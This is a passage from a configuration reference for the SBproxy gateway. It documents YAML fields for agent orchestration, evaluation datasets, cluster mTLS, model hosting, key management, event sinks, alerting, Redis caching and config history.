      evaluation_concurrency: 2
    agents:
      - origin: ai.example
        id: researcher
        endpoint: https://agents.internal/invoke
        auth:
          shared_secret: env:SB_AGENT_SECRET
        capabilities:
          - name: research
            description: Produce a research summary
            input_schema: {type: object}
            output_schema: {type: object}
    workflows:
      - origin: ai.example
        name: research-flow
        initial_state: collect
        max_steps: 4
        timeout_ms: 2000
        states:
          - name: collect
            action: research
            transitions: {}
    datasets:
      - origin: ai.example
        name: support-answers
        version: 1
        entries:
          - input: When can I request a refund?
            expected_output: Refunds are available within 30 days.
            metadata: {case: refund-window}
```

Every configured `origin` value must match a key in the top-level `origins`
map. The compiled origin supplies the tenant/origin scope: an authenticated caller can
discover, execute, evaluate, select, and inspect only resources in that scope.

`agents[].auth.shared_secret` accepts a secret reference only. Examples include
`env:SB_AGENT_SECRET`, `file:...`, and the supported secret-manager URI forms.
Inline material is a compile error. The configured endpoint is dialed only
through `egress.agent_orchestration`, which must be present with
`mode: deny_by_default` when agents are configured.

| Field | Type | Default | Description |
|---|---|---|---|
| `limits` | object | runtime defaults | Optional overrides for bounded counts, bytes, concurrency, and deadlines. |
| `agents` | list | `[]` | Governed endpoints and the capabilities they advertise. |
| `workflows` | list | `[]` | Finite-state workflows whose state `action` names a configured capability. |
| `datasets` | list | `[]` | Immutable, explicitly versioned evaluation datasets seeded at publication. |
| `prompt_rollouts` | list | `[]` | Stable weighted prompt versions selected for a scoped cohort. See [Weighted prompt versioning](prompt-versioning.md). |

Agent fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `origin` | string | required | Existing origin hostname or stable origin id that owns the resource. |
| `id` | string | required | Stable agent identifier inside the scope. |
| `endpoint` | absolute URL | required | Governed invocation endpoint. Redirects do not escape the egress policy. |
| `auth.shared_secret` | secret reference | required | Shared agent credential; inline material is refused. |
| `capabilities` | list | `[]` | Capability name, bounded description, and JSON Schema input/output contracts. |
| `capabilities[].name` | string | required | Exact label workflow states use in `action`. |
| `capabilities[].input_schema` | JSON Schema | required | Compiled before publication and enforced before dispatch. |
| `capabilities[].output_schema` | JSON Schema | required | Compiled before publication and enforced before a response advances the FSM. |

Workflow fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `origin` | string | required | Existing origin that owns the workflow. |
| `name` | string | required | Stable workflow identifier inside the scope. |
| `initial_state` | string | required | Name of the first state to invoke. |
| `max_steps` | int | required | Maximum state invocations in one run. |
| `timeout_ms` | int | required | Whole-workflow deadline, no greater than `limits.max_workflow_timeout_ms`. |
| `states` | list | required | Bounded finite-state graph. |
| `states[].name` | string | required | State identifier, unique inside the workflow. |
| `states[].action` | string | required | Capability to discover, validate, and invoke. |
| `states[].transitions` | map | `{}` | Outcome-to-next-state mapping. No match completes the run. |

Dataset fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `origin` | string | required | Existing origin that owns the dataset. |
| `name` | string | required | Dataset identifier inside the scope. |
| `version` | positive int | required | Exact immutable version; zero is refused. |
| `entries` | list | `[]` | Bounded input/expected-output cases. |
| `entries[].input` | string | required | Recorded evaluation input. |
| `entries[].expected_output` | string | unset | Optional exact answer used for correctness scoring. |
| `entries[].metadata` | JSON | `{}` | Bounded caller metadata retained with the case. |

Prompt-rollout fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `origin` | string | required | Existing origin key that owns the rollout. |
| `name` | string | required | Stable prompt/rollout identifier inside the scope. |
| `salt` | string | required | Stable cohort salt; changing it intentionally reshuffles assignments. Excluded from snapshots and events. |
| `versions` | list | required | Bounded immutable prompt versions. |
| `versions[].version` | positive int | required | Numeric prompt version, unique inside the rollout. |
| `versions[].content` | string | required | Selected prompt template/content. Excluded from admin responses, snapshots, events, and metrics. |
| `versions[].weight` | float | required | Finite non-negative relative weight; the rollout's exact total must be positive and finite. |

Limit overrides are optional; omission inherits the runtime default:

| Limit | Default |
|---|---:|
| `max_agents` | 64 |
| `max_capabilities_per_agent` | 32 |
| `max_workflows` | 64 |
| `max_datasets` | 32 |
| `max_dataset_versions` | 8 |
| `max_dataset_versions_total` | 256 |
| `max_dataset_entries` | 1,000 |
| `max_dataset_bytes_total` | 67,108,864 |
| `max_rollouts` | 128 |
| `max_rollout_versions` | 16 |
| `max_retained_operations` | 256 |
| `max_request_bytes` | 262,144 |
| `max_response_bytes` | 1,048,576 |
| `max_identifier_bytes` | 128 |
| `max_description_bytes` | 512 |
| `max_schema_bytes` | 65,536 |
| `max_secret_bytes` | 256 |
| `max_evaluation_cases` | 1,000 |
| `max_metrics` | 16 |
| `max_judge_criteria` | 16 |
| `agent_concurrency` | 8 |
| `evaluation_concurrency` | 2 |
| `default_workflow_timeout_ms` | 10,000 |
| `max_workflow_timeout_ms` | 60,000 |

All string and serialized-body limits are UTF-8 byte limits.
`max_dataset_versions_total` and `max_dataset_bytes_total` bound the complete
live runtime generation across every origin/tenant scope; the byte ceiling is
the sum of serialized dataset-entry arrays. Their accepted hard maxima are
16,384 versions and 536,870,912 bytes (512 MiB), respectively. Dynamic
registration accepts only origin/tenant scopes compiled into that same
generation and atomically checks the per-scope, per-dataset, and
generation-wide ceilings before insertion.
Invalid schemas, duplicate immutable keys, unknown origins, missing secret
references, unsafe egress, and zero or inconsistent limits refuse publication.
The current generation remains live when a reload candidate fails.

The authenticated routes and request shapes are documented under
[AI toolkit admin](admin-api-reference.md#ai-toolkit-admin). Task-oriented
guides are [Agent orchestration](agent-orchestration.md),
[AI evaluation harness](ai-evaluation-harness.md), and
[Weighted prompt versioning](prompt-versioning.md).

### Cluster fields

`proxy.cluster` creates one process-owned cluster handle used by model control
and the mesh key cache. Production mode requires mTLS plus an authenticated
gossip key:

```yaml
proxy:
  cluster:
    cluster_id: production-models
    node_id: worker-a
    roles: [worker]
    labels: {zone: us-central1-a}
    seeds: [10.10.0.10:7946]
    gossip_port: 7946
    transport_port: 8946
    advertise_addr: 10.10.0.21:7946
    transport_advertise_addr: 10.10.0.21:8946
    model_bind: 0.0.0.0:9443
    model_endpoint: https://10.10.0.21:9443
    state_dir: /var/lib/sbproxy/cluster
    snapshot_ttl_secs: 30
    publish_interval_secs: 5
    dead_peer_gc_secs: 300
    security:
      mode: mtls
      shared_key: file:/var/lib/sbproxy/cluster/gossip.key
      cert_file: /var/lib/sbproxy/cluster/node.pem
      key_file: /var/lib/sbproxy/cluster/node-key.pem
      ca_file: /var/lib/sbproxy/cluster/ca.pem
      server_name: sbproxy-mesh
```

| Field | Type | Default | Description |
|---|---|---|---|
| `cluster_id` | string | required | Stable logical cluster identity shared by every member. |
| `node_id` | string | required | Stable unique node identity. |
| `roles` | list | required | Any combination of `gateway`, `worker`, and `authority`. |
| `labels` | map | `{}` | Bounded authenticated placement and failure-domain labels. |
| `seeds` | list | `[]` | Static UDP gossip seed addresses in `host:port` form. |
| `gossip_port` | int | `7946` | UDP SWIM listener. |
| `transport_port` | int | `8946` | TCP typed-state and cache transport listener. |
| `advertise_addr` | string | observed address | Gossip address advertised to peers. Enrolled mTLS startup requires an explicit routable IP and port. |
| `transport_advertise_addr` | string | advertised host plus transport port | mTLS typed-state address advertised to peers. |
| `model_bind` | IP:port | unset | Dedicated private HTTP/2 model-plane listener. Worker role only; requires `model_endpoint`. |
| `model_endpoint` | absolute HTTP URL | unset | Private model-plane origin advertised by workers. Production mTLS requires `https://`; explicit shared-key development requires `http://`. Required for peer placement eligibility. |
| `state_dir` | path | required | Installed identity plus durable boot, peer-identity high-water, snapshot generation, deployment generation, and authority cursor state. |
| `snapshot_ttl_secs` | int | `30` | Worker snapshot lifetime; at least two publish intervals. |
| `publish_interval_secs` | int | `5` | Snapshot publication cadence. |
| `dead_peer_gc_secs` | int | `300` | Seconds before SWIM removes a dead or gracefully-left peer from routing membership. The admin roster retains a bounded tombstone after this GC. A node that exits cleanly announces `Left` to a fan-out of live peers on SIGTERM, so it is evicted under `graceful_leave` rather than a suspect window later under `dead_timeout`. That announcement is a wire break: every node in the cluster must understand `Left`. |
| `security.mode` | enum | required | `mtls` for production or `shared_key` for explicit development. |
| `security.development` | bool | `false` | Must be true for shared-key-only mode. |
| `security.shared_key` | secret reference | unset | UDP gossip key; required in mTLS production mode too. |
| `security.cert_file`, `key_file`, `ca_file` | paths | unset | Per-node mTLS material. |
| `security.server_name` | string | `sbproxy-mesh` | Cluster SAN bound into enrollment. Canonical outbound transport additionally verifies the target `node_id` SAN. |
| `enrollment.authority_dir` | path | unset | Identity directory used by an authority-role process to enroll nodes. |
| `deployment_authority.verifying_key_file` | path | unset | Ed25519 public key installed on every node. |
| `deployment_authority.signing_key_file` | path | unset | Authority-only Ed25519 private key. |

Canonical mTLS supports built-in enrollment or operator-managed PKI. Enrollment
startup verifies `state_dir/identity.json` with
`state_dir/authority-verifying.key`. Manual PKI omits both files and requires
the leaf certificate to contain the node ID DNS SAN plus exactly one SBproxy
identity URI SAN with cluster ID, node ID, roles, labels, server name, and a
positive identity epoch. Every claim must match config. Do not mix attestation
modes within a cluster, and increment the manual identity epoch for certificate
rotation. `state_dir` also stores an atomically advanced boot epoch used to
reject join replay after restart. Each verifier durably retains the highest
accepted identity, certificate, and boot epoch per peer. Model controllers
persist per-deployment generation high-water marks before publishing a
placement commit, so an unplaced or fully drained deployment cannot reset after
restart. Identity, roles, labels, discovery, listeners, advertised endpoints,
security, state, dead-peer GC, and authority changes require restart. Snapshot
cadence reloads in place.
The model plane accepts only its internal versioned dispatch path. Production
uses mTLS with HTTP/2 ALPN and peer-identity proofs; explicit development mode
uses h2c plus HMAC. `model_bind` is never an engine port and should be reachable
only from cluster gateways.
See [model-host.md](model-host.md#cluster-configuration) for enrollment,
placement, signed bundle, and admin status workflows.

### Model-host fields

`proxy.model_host` is the canonical managed-model desired state:

```yaml
proxy:
  model_host:
    authority: file_managed
    catalog_file: /etc/sbproxy/models.yaml
    max_parallel_prepares: 2
    safety_margin: 0.10
    shutdown_deadline_ms: 30000
    handoff_timeout_ms: 60000
    cache:
      directory: /var/lib/sbproxy/models
      budget_gib: 100
      max_resident_models: 2
    deployments:
      local-qwen:
        model: qwen2.5-0.5b-instruct
        variant: q4_k_m
        replicas: 2
        required_labels: {accelerator: l4}
        spread_by: [zone]
        pull: on_boot
        warm: true
        cold_start: fallback
        engine: llama_cpp
        rollout: rolling
```

Authority values are `file_managed`, `admin_managed`, and
`cluster_authority`. Deployment pull values are `on_boot`, `on_demand`, and
`manual`; cold-start values are `wait`, `reject`, and `fallback`; rollout values
are `rolling` and `recreate`. `wait` coordinates a bounded launch per selected
replica generation, `reject`
returns a retryable `503` with `Retry-After: 1`, and `fallback` advances to the
next provider without launching. For `authority: file_managed`, omission
follows the security profile: production mTLS clusters use `fallback`, while
development and non-clustered runtimes use `wait`. Admin-managed and
cluster-authority deployments must set `cold_start` explicitly. Replicated
homogeneous deployments must pin a variant unless
`heterogeneous_variants: true` is set.
`catalog_file` selects a catalog v2 document and resolves relative paths from
the directory containing `sb.yml`; omission uses the built-in catalog. A
canonical `catalog_file` takes precedence over compatibility provider
`serve.catalog_file` declarations.
`required_labels` filters workers and `spread_by` orders failure domains.
`handoff_timeout_ms` bounds how long rolling placement retains losing
assignments while target readiness converges. See [model-host.md](model-host.md)
for the engine, cache, admission, placement, and rollout contracts.

### Agent registry fields

`proxy.agent_registry` runs two things over one embedded redb file: a
subscriber for a signed agent catalog, and an owner-approval queue for agent
self-registration. Disabled by default, and naming the block without
`enabled: true` opens no store file. Every key here is applied at boot; a
reload that changes any of them is refused by name. See
[agent-registry.md](agent-registry.md) for the walkthrough.

```yaml
proxy:
  agent_registry:
    enabled: true
    store_path: /var/lib/sbproxy/agent-registry.redb
    feed_path: /var/lib/sbproxy/agents/feed.json
    key_directory_path: /var/lib/sbproxy/agents/keys.json
    bootstrap_keys:
      publisher-2026: "8Fh0K0m5r0kQ1nQ0S8y1u3H3fQ4l9tGm2r7bQ0aXyZ0="
    stale_grace_secs: 0
    duplicate_window_secs: 3600
    rotation_grace_secs: 2592000
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `false` | Master switch. False opens no store file and claims no admin routes. |
| `store_path` | path | required | Embedded store holding the catalog cache and the registration queue. Created owner-only in the `open(2)` call. |
| `feed_path` | path | unset | Signed catalog feed, a file you sync. SBproxy reads and verifies it and never dials for it. Absent means no refresh is possible and the refresh route says so. |
| `key_directory_path` | path | unset | Signed key directory naming the feed signing keys. Required whenever `feed_path` is set. |
| `bootstrap_keys` | map | `{}` | Public Ed25519 keys, keyed by key id, valued as base64 of the raw 32 bytes. Public material only, so it belongs in version control. An empty map trusts nothing and refuses every feed; there is no key compiled into the binary. |
| `stale_grace_secs` | int | `0` | How far past its own `expires_at` a feed may still be applied. Zero honors the publisher's expiry exactly. Also sets the refresh interval, clamped to `[60s, 1h]`; zero falls back to 300 seconds. |
| `duplicate_window_secs` | int | `3600` | How long an identical resubmission of an *undecided* registration is treated as a retry. A decided one is refused durably and forever, which is not this key's business. |
| `rotation_grace_secs` | int | `2592000` | How long a rotated-away client secret keeps authenticating, so a fleet picks up a new secret without a synchronized restart. |

Each of the three duration keys is refused at startup, by name, if it is
larger than a duration the proxy can represent.

The pending queue is bounded at 5,000 and there is no key for it. Past that
the submission route answers `429` with a named reason; terminal records are
the durable replay refusal and the audit trail and are not counted against
the cap. The bound is deployment-wide rather than per tenant, so it is not a
tenant isolation mechanism. See [agent-registry.md](agent-registry.md).

### Notification fields

`proxy.notifications` is the customer-facing webhook side of the event feed:
several destinations, each with its own filter and its own signing key,
managed at runtime through `/admin/notifications` rather than by editing this
file. `events:` remains the one-collector SIEM feed. Boot-only, like the
registry above. See [notifications.md](notifications.md).

```yaml
proxy:
  notifications:
    enabled: true
    store_path: /var/lib/sbproxy/notifications.redb
    queue_capacity: 4096
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `false` | Master switch. False opens no store file and answers `404` on `/admin/notifications`. |
| `store_path` | path | required | Embedded store holding the subscriptions and the deadletter queue. It holds live HMAC signing secrets, which cannot be one-way hashed because a signature has to be re-derived on every delivery, so it is created owner-only and belongs on the volume you already trust with the rest of your configuration. |
| `queue_capacity` | int | `4096` | Bound on the hand-off queue between the request path and the delivery worker. A full queue drops the event and counts the drop rather than making a request wait on a customer's endpoint. |

### Key management crypto, audit, and break-glass fields

`proxy.key_management` is documented in full in
[key-management.md](key-management.md). This section covers the crypto,
read-audit, and break-glass sub-blocks; the store, cache, governance, inbound,
and seed sub-blocks live on that page.

```yaml
proxy:
  key_management:
    enabled: true
    crypto:
      pepper: env:SBPROXY_KEY_PEPPER
      master_key: env:SBPROXY_KEY_MASTER
      root_of_trust:
        provider: vault_transit
        address: https://vault.internal:8200
        key_name: sbproxy-root
        token: env:SBPROXY_TRANSIT_TOKEN
      rotation:
        credential_days: 90
        credential_grace_secs: 300
    read_audit:
      enabled: true
    break_glass:
      enabled: true
      approvers: [alice, bob, carol]
      quorum: 2
```

`key_management.crypto`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `pepper` | string | unset | Server pepper for inbound virtual-key hashing. A secret reference (`env:`, `file:`, `vault://`, ...) or an inline literal. Required when `key_management.enabled` unless `allow_ephemeral_secrets` is set: an unpinned pepper is regenerated on restart and every stored key hash stops verifying. |
| `master_key` | string | unset | Master key for the upstream-credential envelope. Same forms and same requirement as `pepper`. Also derives the key-audit chain's fingerprint key, and still opens envelopes sealed before a customer-managed root was configured. |
| `allow_ephemeral_secrets` | bool | `false` | Let the process mint its own `pepper` and `master_key` when neither is pinned, warning on every boot. For a local development run only: the key plane then does not outlive the process. |
| `root_of_trust` | object | unset | Customer-managed root of trust for the credential envelope. Absent means `master_key` is the root. See below. |
| `rotation` | object | | Named crypto periods and the credential rotation overlap. See below. |

`key_management.crypto.root_of_trust`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `provider` | enum | required | Which external key service performs the wrap and unwrap. `vault_transit` is the only value: its contract returns ciphertext and plaintext and never the key, which is what makes the claim true. |
| `address` | string | required | Base address of the key service, for example `https://vault.internal:8200`. |
| `mount` | string | `transit` | Transit mount path. |
| `key_name` | string | required | Name of the Transit key that wraps sbproxy's data keys. Created and owned by the customer; sbproxy never creates it. |
| `token` | string | required | Secret reference for the token sbproxy authenticates with. Resolved once at boot. Losing it is a second, independent way for the customer to cut sbproxy off. |
| `namespace` | string | unset | Optional Vault Enterprise namespace header. |
| `unwrap_cache_ttl_secs` | int | `60` | How long an unwrapped data key may be reused before the key service is consulted again. **This number is the deployment's revocation-latency bound in full, not the first of two windows** and is reported verbatim on `GET /admin/crypto/root-of-trust`. A decrypted credential inherits the time left on the data key that opened it rather than starting a fresh window, so the two caches in series do not compose: clamping each to the same value would have given up to twice it. |
| `liveness_interval_secs` | int | `30` | How often to probe the key service for reachability and continued authorization. A failed probe drops every cached data key *and* every already-decrypted credential, which is what turns the TTL above into an upper bound rather than a bound on only the first of the two caches. Zero disables the probe; the on-demand path still fails closed. |

`key_management.crypto.rotation`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `inbound_key_days` | int | `90` | Named crypto period for minted virtual keys. Nothing enforces it; it is the number to alert `sbproxy_key_rotation_age_days{kind="key"}` against, which `GET /admin/keys` publishes from each key's `rotated_at`. |
| `credential_days` | int | `90` | Named crypto period for upstream provider credentials, alerted the same way on `{kind="credential"}`, which `GET /admin/credentials` publishes. Both gauges are refreshed by the listing rather than by a timer, so a deployment that never lists never pays and never sees them move. |
| `master_key_days` | int | `365` | Named crypto period for the envelope master key. Under a customer-managed root this is the customer's Transit key cadence, not sbproxy's. |
| `credential_grace_secs` | int | `300` | Default overlap window for `POST /admin/credentials/{id}/rotate`: how long the previous material stays usable when the new material will not resolve. Zero retires the old material at once, which is what a compromised secret needs. |

`key_management.read_audit`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `false` | Emit chained detail records for credential resolutions. `sbproxy_credential_read_total` is unconditional and is not gated by this. Reaching the chain also needs `audit.key_path`. |
| `detail_window_secs` | int | `300` | Minimum seconds between detail records for the same credential. The first resolution in each window emits; the rest are counted `suppressed`, so cost scales with credential count rather than with request rate. |
| `hash_identifiers` | bool | `true` | Replace the credential id in the detail record with `hmac-sha256:<hex>` under the key-audit fingerprint key, so a chain handed to an auditor does not enumerate which credentials exist. Timestamps, outcomes, and tenant pass through readable. With no fingerprint key installed the record is refused rather than emitted in the clear. |

`key_management.break_glass`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `false` | Turn on `/admin/break-glass`. Off by default: an emergency path nobody configured is an emergency path nobody reviews. |
| `approvers` | list | `[]` | Admin usernames who may approve a grant. A requester is never counted among their own approvers even when listed here. |
| `quorum` | int | `2` | How many distinct approvers a grant needs before it activates. Config compile refuses `0` (a grant would activate on its first approval while the admin surface called it quorate) and refuses a value above the number of configured approvers (no grant could ever activate, and you would find out during the incident). |
| `max_ttl_secs` | int | `3600` | Hard cap on a requested TTL. A request naming more is refused rather than clamped, so the requester finds out at request time instead of at expiry. |
| `review_window_secs` | int | `86400` | How long after expiry an unreviewed grant is merely open rather than overdue. Drives the overdue marker on `GET /admin/break-glass`, not deletion. |

### Metrics fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `max_cardinality_per_label` | int | 1000 | Default cap on unique label values per metric. New values are collapsed to `__other__`. |
| `cardinality.hostname_cap` | int | 200 | Optional override for the `hostname` label budget. Useful for high-tenant-count deployments and deterministic overflow tests. |

### Durable usage rollups

`proxy.observability.usage_rollups` stores hourly and daily request, token,
cost, and outcome aggregates in an embedded database. It is enabled by default
and backs the windowed Spend API and UI.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `true` | Record durable rollups. If the path cannot be opened, the proxy logs a warning and continues with rollups unavailable. |
| `path` | path | `/var/lib/sbproxy/usage-rollups.redb` | Embedded rollup database. |
| `retention_hourly_days` | int | `90` | Days of hourly buckets retained before compaction. |
| `retention_daily_days` | int | `395` | Days of daily buckets retained. |

### access_log

Top-level block (sibling of `proxy:` and `origins:`) that turns on structured-JSON access logging. Off by default. When enabled, every completed request emits one JSON line at info level via the `access_log` tracing target after status, method, and sampling filters apply. Secrets are redacted before the line is written. See [Access log](access-log.md) for the full record shape.

```yaml
access_log:
  enabled: true
  sample_rate: 1.0
  status_codes: []           # empty = log every status
  methods: []                # empty = log every method
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `false` | Master switch. When false, no access-log lines are emitted. |
| `sample_rate` | float | `1.0` | Probability in `[0.0, 1.0]` that a matching request is logged. |
| `status_codes` | list | `[]` | HTTP status codes to log. Empty matches every status. |
| `methods` | list | `[]` | HTTP methods to log (case-insensitive). Empty matches every method. |

### request_events

Top-level block (sibling of `proxy:` and `origins:`) naming where completed
request events go. `none` is the default and discards them. `logging` and
`file` are local; `nats` and `clickhouse` are the two optional network
destinations, and both are always compiled in, so a typo is a validation
error rather than a differently built binary. See
[event-ingest.md](event-ingest.md) for the NATS subject rules, the ClickHouse
DDL, and the delivery guarantee.

Boot-only: `request_events` installs a process-global sink through a
set-once slot, so a reload that changes the block is refused by name rather
than accepted and ignored.

```yaml
request_events:
  sink: nats
  queue_capacity: 8192
  watermark_store_path: /var/lib/sbproxy/event-ingest.redb
  nats:
    address: broker.internal:4222
    subject_prefix: sb.events
    token: vault://kv/data/sbproxy#nats_token
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `sink` | enum | `none` | One of `none`, `logging`, `file`, `nats`, `clickhouse`. |
| `path` | string | unset | NDJSON output path. Required for `sink: file`, ignored otherwise. |
| `nats` | object | unset | Broker settings. Required for `sink: nats`, ignored otherwise. |
| `clickhouse` | object | unset | Warehouse settings. Required for `sink: clickhouse`, ignored otherwise. |
| `watermark_store_path` | path | unset | Embedded store holding the delivery checkpoint, so an operator reconciling a broker or a warehouse against the proxy has a position that survives a restart. Absent keeps no checkpoint. |
| `queue_capacity` | int | `8192` | Bound on the hand-off queue between the request path and the delivery worker, for `nats` and `clickhouse`. A full queue drops the event and counts the drop. |

`request_events.nats`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `address` | string | required | `host:port` of the broker. Not a URL: this speaks the core NATS protocol over plain TCP, and a `nats://` string would suggest a URL parser that is not there. |
| `subject_prefix` | string | `sb.events` | Prefix every subject starts with. The published subject is `<prefix>.<workspace_id>.<event_type>`, with the workspace id sanitized so it cannot add a level or name a wildcard. |
| `token` | secret ref | unset | Authentication token, resolved through `proxy.secrets`. A literal is refused the same way every other credential reference is. The token crosses the network unencrypted; keep the broker on a trusted segment, and see the TLS note in [event-ingest.md](event-ingest.md). |

`request_events.clickhouse`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | HTTP endpoint, for example `http://clickhouse.internal:8123`. |
| `database` | string | `sbproxy` | Refused unless it matches `[A-Za-z0-9_]+`. |
| `table` | string | `request_events` | Refused unless it matches `[A-Za-z0-9_]+`. The proxy never applies DDL; create the table first. |
| `user` | string | unset | Optional user, sent as `X-ClickHouse-User`. |
| `password` | secret ref | unset | Resolved through `proxy.secrets`, sent as `X-ClickHouse-Key`. |

### Alerting fields

The `proxy.alerting` block defines notification channels that receive alert events from the runtime.

```yaml
proxy:
  alerting:
    channels:
      - type: webhook
        url: https://hooks.example.com/sbproxy
        headers:
          X-Auth: ${ALERT_TOKEN}
      - type: slack
        url: ${SLACK_INCOMING_WEBHOOK}
      - type: pagerduty
        routing_key: ${PAGERDUTY_ROUTING_KEY}
      - type: log
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `channels` | list | `[]` | Notification channels. |
| `channels[].type` | string | required | Channel type. Supported: `webhook`, `slack`, `pagerduty`, `log`. |
| `channels[].url` | string | | Required for `webhook` and `slack`. Slack expects an incoming-webhook URL. |
| `channels[].headers` | map | `{}` | Extra HTTP headers added to webhook deliveries. |
| `channels[].routing_key` | secret reference | | Required for `pagerduty`; sent to Events API v2 and never exposed by the admin API. |

Webhook and Slack deliveries pass through the same SSRF guard as the rest of
the proxy's outbound calls, so a channel pointed at a private or loopback
address is rejected at delivery time and the admin Alerts page reports the
channel as `failing` with "target rejected by SSRF policy". Point a local
receiver at a routable address when testing.

An alert channel accepts exactly `type`, `url`, `headers`, and `routing_key`.
A `secret:` key on a channel is rejected at config load as an unknown key;
alert-webhook payload signing is not configurable yet. To sign webhook
deliveries, use the `secret` field on per-origin `on_request` / `on_response`
callbacks instead. See [Webhook envelope and signing](#webhook-envelope-and-signing).

The block in `sb.yml` is the configuration authority. The admin Alerts page
and `GET /api/alerts` expose read-only rule state, sanitized channel targets,
process-lifetime delivery health, and up to 200 recent events. The built-in
provider error-rate rule requires at least 10 attempts in an evaluation window;
smaller samples remain inactive. `POST /api/alerts/test` can test one channel
without changing configuration.

Alert webhook deliveries also include the standard `X-Sbproxy-*` identity headers (`Event`, `Instance`, `Rule`, `Severity`, `Timestamp`) and a `User-Agent: sbproxy/<version>`. The body is wrapped in an envelope:

```json
{
  "event": "alert",
  "proxy": { "instance_id": "...", "version": "..." },
  "alert": { "rule": "...", "severity": "...", "message": "...", "timestamp": "...", "labels": { ... } }
}
```

### l2_cache_settings

The `l2_cache_settings` block points the proxy at a shared key-value backend used for cluster-wide rate limit counters and (optionally) response cache entries. When it is set, rate limits are enforced exactly across replicas.

When it is unset, what happens depends on whether the node is on a mesh. A standalone replica keeps its own in-memory state. A node with `proxy.cluster` configured converges its per-minute rate limit counters over gossip instead, which is approximate rather than exact; see the `rate_limit` policy for the overshoot bound. Response cache entries are per-replica either way.

The deserializer also accepts `l2_cache:` as an alias.

The `driver` field selects the backend; `params` is a flat string map whose keys depend on the driver. Only the `redis` driver is implemented in the Rust proxy today.

```yaml
proxy:
  l2_cache_settings:
    driver: redis
    params:
      dsn: rediss://cache-user:${REDIS_PASSWORD_URLENCODED}@redis.internal:6380/7
      ca_file: /etc/sbproxy/redis/ca.pem
      cert_file: /etc/sbproxy/redis/client.pem
      key_file: /etc/sbproxy/redis/client-key.pem
```

`params` keys for the `redis` driver:

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `dsn` | string | required | Redis connection. Accepts a legacy hostname or `host:port`, a `redis://` URL, or a verified `rediss://` URL. URL paths select a non-negative logical database. |
| `ca_file` | string | unset | PEM trust anchor for a private Redis CA. Valid only with `rediss://`. When omitted, verified TLS uses system trust roots. |
| `cert_file` | string | unset | PEM client certificate chain for Redis mTLS. Must appear with `key_file` and requires `rediss://`. |
| `key_file` | string | unset | PEM private key matching `cert_file`. Must appear with `cert_file` and requires `rediss://`. |

Legacy `redis.internal` and `redis.internal:6379` values remain compatible and
normalize to plaintext `redis://` connections. Bracketed IPv6 addresses are
accepted. Unbracketed ambiguous IPv6 addresses are rejected.

Use `redis://` only for an intentionally plaintext connection. `rediss://`
performs certificate verification and never retries as plaintext. Redis ACL
username and password authentication, password-only authentication, and
database paths are preserved during connection setup. Percent-encode reserved
characters in credentials, such as `%40` for `@` and `%2F` for `/`; environment
interpolation does not URL-encode a value for you.

Configuration loading validates the URL, supported scheme, database syntax,
TLS field combinations, PEM material, and client certificate/key match. It
does not contact Redis. The first L2 operation opens the connection and performs
TLS, `AUTH`, and `SELECT`, so an unreachable service or a server-side trust,
authentication, or database rejection appears at runtime. Query parameters,
URL fragments such as `#insecure`, negative databases, and a username without
a password are rejected instead of being weakened.

Pool size, pool acquisition timeout, connection timeout, and command timeout
are not exposed through `params`. The built-in pool size is 8 and each timeout
defaults to 5 seconds.

AI context compression with `summary_buffer` reuses this same validated DSN,
private CA, client certificate, and client key. The compression block does not
accept a separate Redis connection.

Do not roll a secure deployment back to a release that predates these fields.
Older releases are safe only for unauthenticated plaintext database-zero
deployments because they did not preserve TLS, authentication, or database
selection.

### compression_state

`proxy.compression_state` configures the process-owned redb file used when an
AI `summary_buffer` pipeline selects `backend: local`. A `summary_buffer` with
no action-level `state` block defaults to Local with a 24-hour TTL.

```yaml
proxy:
  compression_state:
    local_path: /var/lib/sbproxy/compression-state.redb
```

| Field | Type | Default | Description |
|---|---|---|---|
| `local_path` | string | platform selection | Absolute redb database path. It must be nonempty, at most 4096 bytes, and contain no control characters. |

Configuration validation checks only the path string and performs no
filesystem I/O. At runtime, an explicit path wins. Without one, SBproxy tries
a writable `/var/lib/sbproxy/compression-state.redb`, then
`$XDG_STATE_HOME/sbproxy/compression-state.redb`, then
`$HOME/Library/Application Support/sbproxy/compression-state.redb` on macOS or
`$HOME/.local/state/sbproxy/compression-state.redb` on other Unix systems.
Only absolute environment paths participate. Windows requires an explicit
path. A required path that cannot be opened fails startup and names the path.

The file is a one-process durability boundary, not shared fleet state. It
contains generated summaries in plaintext, so protect the directory, file,
snapshots, and backups as prompt data. Deleted and expired pages are reusable,
but redb may keep the file at its high-water allocation instead of shrinking it
immediately. Use explicit Redis or mesh state for traffic that can move between
processes.

### config_history

`proxy.config_history` opens a durable, content-addressed ring of every
config this proxy applies, kept as plain files on local disk. Disabled by
default, like every other opt-in `proxy`-level block; an existing deployment
does not start writing config revisions anywhere until you turn it on.

```yaml
proxy:
  config_history:
    enabled: true
    dir: /var/lib/sbproxy/config-history
    keep: 20
    keep_rejected: 10
    soak:
      window_secs: 120
      min_requests: 50
      max_error_rate_delta: 0.05
      require_no_degraded_subsystems: true
      require_upstream_health: true
      auto_revert: false
      probe:
        url: http://127.0.0.1:8080/healthz
        expect_status: 200
        interval_secs: 10
    boot:
      fallback: off
      max_attempts: 3
      success_secs: 30
```

| Field | Type | Default | Description |
|---|---|---|---|
| `enabled` | bool | `false` | Master switch. |
| `dir` | string | `/var/lib/sbproxy/config-history` | Directory the ring lives in. |
